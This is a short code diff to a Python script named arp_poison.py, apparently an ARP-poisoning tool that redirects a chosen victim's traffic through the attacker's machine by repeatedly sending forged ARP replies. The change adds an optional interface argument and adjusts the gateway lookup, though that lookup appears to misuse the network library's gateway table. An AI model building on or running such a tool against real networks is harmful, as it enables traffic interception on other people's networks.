@@ -53,8 +53,8 @@ def relay_ip(from_ip, to_ip):
 
 def main():
     global victim_ip, victim_mac, gateway_ip
-    if len(sys.argv) != 2:
-        print 'Usage: python arp_poison.py <victim ip>'
+    if len(sys.argv) not in (2, 3):
+        print 'Usage: python arp_poison.py victim_ip [interface_name]'
         exit(1)
 
     device_name = pcap.lookupdev()
@@ -63,7 +63,8 @@ def main():
     my_mac = MacAddress(addresses[netifaces.AF_LINK][0]['addr'])
     my_ip = IPv4Address(addresses[netifaces.AF_INET][0]['addr'])
 
-    gateway_ip = IPv4Address(netifaces.gateways()['default'][netifaces.AF_INET][0])
+    interface_name = 'default' if len(sys.argv) < 3 else sys.argv[2]
+    gateway_ip = IPv4Address(netifaces.gateways()[interface_name][netifaces.AF_INET][0])
     victim_ip = IPv4Address(sys.argv[1])
     print
 
@@ -98,7 +99,6 @@ def main():
     pool = Pool()
     replier = pool.spawn(reply_to_request, infection_arp)
     periodical = pool.spawn(send_periodically, infection_arp)
-    periodical.start()
     pool.join()
 
 
